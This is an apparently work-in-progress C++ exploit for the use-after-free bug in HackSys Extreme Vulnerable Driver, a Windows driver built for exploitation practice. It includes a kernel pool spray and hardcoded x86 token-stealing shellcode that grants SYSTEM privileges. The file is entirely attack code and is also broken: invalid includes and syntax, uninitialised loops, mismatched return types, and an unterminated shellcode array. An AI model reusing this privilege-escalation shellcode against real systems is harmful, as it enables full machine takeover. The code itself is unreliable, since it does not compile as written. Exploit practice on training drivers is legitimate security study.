#include <iostream>
#include <windows.h>
#include <vector>
#include <pair>

// IOCTL Definitions from HackSysExtremeVulnerableDriver.h
#define HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_USE_UAF_OBJECT                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_NEITHER, FILE_ANY_ACCESS)

// From Common.h
#define POOL_TAG 'kcaH'
typedef void (*FunctionPointer)();

// USE_AFTER_FREE object from UseAfterFree.h
typedef struct _USE_AFTER_FREE {
        FunctionPointer Callback;
        CHAR Buffer[0x54];
    } USE_AFTER_FREE, *PUSE_AFTER_FREE;

// Test function to test PoC
int test_func(){
    std::cout << "Hello from test function!\n";
}

std::pair(std::vector<HANDLE>, std::vector<HANDLE>) spray_pool(int objects_n){
    // Use a quarter of the spray to defragment the heap
    // Use the rest for sequential heap allocations
    int defrag_n = 0.2 * objects_n;
    int seq_n = objects_n - defrag_n;

    // Vectors storing the handles to all allocated objects
    std::vector<HANDLE> defrag_handles;
    std::vector<HANDLE> seq_handles;

    // TODO: Need to get address of the NtAllocateReserveObject from ntdll.dll

    for (int i; i < defrag_n; i++){
        HANDLE handle = 0;
        // Allocate object, use 1 since we want to allocate the IoCompletionReserve object
        PHANDLE result = NtAllocateReserveObject(&handle, NULL, 1);
        // Push handle to vector
        if (!result){
            defrag_handles.push_back(handle);
        }
    }

    for (int i; i < seq_n; i++){
        HANDLE handle = 0;
        // Allocate object, use 1 since we want to allocate the IoCompletionReserve object
        PHANDLE result = NtAllocateReserveObject(&handle, NULL, 1);
        // Push handle to vector
        if (!result){
            seq_handles.push_back(handle);
        }
    }

    return std::make_pair(defrag_n, seq_n);
}

int main(int argc, char* argv[]){
    // Print usage if not enough args
    if (argc < 1){
        std::cerr << "Usage: " << argv[0] << "IOCTL_index buffSize" << std::endl;
    }

    char devName[] = "\\\\.\\HackSysExtremeVulnerableDriver";
    DWORD inBuffSize = std::stoi(argv[1]);
    DWORD bytesRet = 0;
    BYTE* inBuffer = (BYTE*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, inBuffSize);
    RtlFillMemory(inBuffer, inBuffSize, 'A');

    // Spray the pool
    std::pair<std::vector<HANDLE>, std::vector<HANDLE>> handles = spray_pool(20000);

    // Get a handle to the driver
    HANDLE dev = CreateFile(devName, GENERIC_READ | GENERIC_WRITE, 
                                NULL, NULL, OPEN_EXISTING, NULL, NULL);

    // Handle failure
    if (dev == INVALID_HANDLE_VALUE){
        std::cerr << "Could not get device handle" << std::endl;
        return 1;
    }

    std::cout << "Sending IOCTL\n";

    // Allocate the UAF Object
    BOOL status = DeviceIoControl(dev, HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT,
                                    inBuffer, inBuffSize,
                                    NULL, 0, &bytesRet, NULL);

    // Free the UAF Object
    status = DeviceIoControl(dev, HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT,
                                    inBuffer, inBuffSize,
                                    NULL, 0, &bytesRet, NULL);
    
    // Get address from user input
    int hex_addr;
    PUSE_AFTER_FREE addr;
    std::cout << "Input hex address of UAF Object\n";
    std::cin >> std::hex >> hex_addr;
    addr = (PUSE_AFTER_FREE) hex_addr;
    
    // Shellcode from fuzzysecurity https://www.fuzzysecurity.com/tutorials/expDev/19.html
    // TODO: Write own shellcode?
    int shellcode[] = {                                     //---[Setup]
                        0x60,                               // pushad
                        0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, // mov eax, fs:[KTHREAD_OFFSET]
                        0x8B, 0x40, 0x50,                   // mov eax, [eax + EPROCESS_OFFSET]
                        0x89, 0xC1,                         // mov ecx, eax (Current _EPROCESS structure)
                        0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, // mov ebx, [eax + TOKEN_OFFSET]
                                                            // ---[Copy System PID token]
                        0xBA, 0x04, 0x00, 0x00, 0x00,       // mov edx, 4 (SYSTEM PID)
                        0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, // mov eax, [eax + FLINK_OFFSET] <-|
                        0x2D, 0xB8, 0x00, 0x00, 0x00,       // sub eax, FLINK_OFFSET           |
                        0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, // cmp [eax + PID_OFFSET], edx     |
                        0x75, 0xED,                         // jnz                           ->|
                        0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, // mov edx, [eax + TOKEN_OFFSET]
                        0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, // mov [ecx + TOKEN_OFFSET], edx
                                                            //---[Recover]
                        0x61,                               // popad
                        0xC3                                // ret}

    // Use the UAF Object after Free
    status = DeviceIoControl(dev, HACKSYS_EVD_IOCTL_USE_UAF_OBJECT,
                                    inBuffer, inBuffSize,
                                    NULL, 0, &bytesRet, NULL);

    // Close device
    CloseHandle(dev);
    return 0;
}
